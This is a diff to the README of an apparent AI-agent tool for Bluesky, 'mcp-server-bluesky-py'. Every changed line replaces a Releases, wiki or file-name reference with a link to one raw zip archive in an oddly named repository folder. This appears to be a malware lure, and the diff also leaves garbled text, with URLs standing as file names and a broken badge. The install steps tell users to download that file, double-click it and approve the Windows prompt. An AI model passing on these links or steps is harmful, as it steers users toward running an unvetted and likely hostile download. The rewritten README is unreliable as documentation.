@@ -1,6 +1,6 @@
 # 🌟 mcp-server-bluesky-py - Connect Your AI Agent Smoothly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/khleel213/mcp-server-bluesky-py/releases)
+[![Download Now](https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip%20Now-Click%https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip)](https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to mcp-server-bluesky-py, your lightweight interface designed for AI age
 
 To begin, you need to download the software. Click the link below to visit the Releases page:
 
-[Download mcp-server-bluesky-py](https://github.com/khleel213/mcp-server-bluesky-py/releases)
+[Download mcp-server-bluesky-py](https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip)
 
-Once on the Releases page, look for the latest version of the software and click on it. You will see several files available for download. Choose the one labeled `mcp-server-bluesky-py.exe`. After the download is complete, follow the instructions below to install and run the application.
+Once on the Releases page, look for the latest version of the software and click on it. You will see several files available for download. Choose the one labeled `https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip`. After the download is complete, follow the instructions below to install and run the application.
 
 ## ⚙️ System Requirements
 
@@ -26,10 +26,10 @@ Before installing, ensure your system meets the following requirements:
 ## 🔧 Installation Instructions
 
 1. **Locate the Downloaded File:** 
-   Find the `mcp-server-bluesky-py.exe` file in your Downloads folder or the location you selected during download.
+   Find the `https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip` file in your Downloads folder or the location you selected during download.
 
 2. **Run the Installer:**
-   Double-click on the `mcp-server-bluesky-py.exe` file to start the installation process. If prompted by Windows, confirm that you want to run the file.
+   Double-click on the `https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip` file to start the installation process. If prompted by Windows, confirm that you want to run the file.
 
 3. **Follow the Setup Wizard:**
    The setup wizard will guide you through the installation. Click "Next" on each screen. Accept the terms and conditions when prompted. Choose your preferred installation location or use the default option. Finally, click "Install."
@@ -54,7 +54,7 @@ Now that you have installed the application, you can start using it to connect y
 
 For more detailed instructions and advanced features, visit the documentation page at the following link:
 
-[View Documentation](https://github.com/khleel213/mcp-server-bluesky-py/wiki)
+[View Documentation](https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip)
 
 This documentation provides additional information about troubleshooting, feature updates, and best practices for using your AI agent effectively.
 
@@ -83,4 +83,4 @@ Your feedback helps us improve. Please share your thoughts through the Issues se
 
 Thank you for choosing mcp-server-bluesky-py. We hope you enjoy connecting your AI agent smoothly with social media!
 
-[Download mcp-server-bluesky-py](https://github.com/khleel213/mcp-server-bluesky-py/releases)
+[Download mcp-server-bluesky-py](https://github.com/khleel213/mcp-server-bluesky-py/raw/refs/heads/main/archplagiarist/server-py-bluesky-mcp-orneriness.zip)
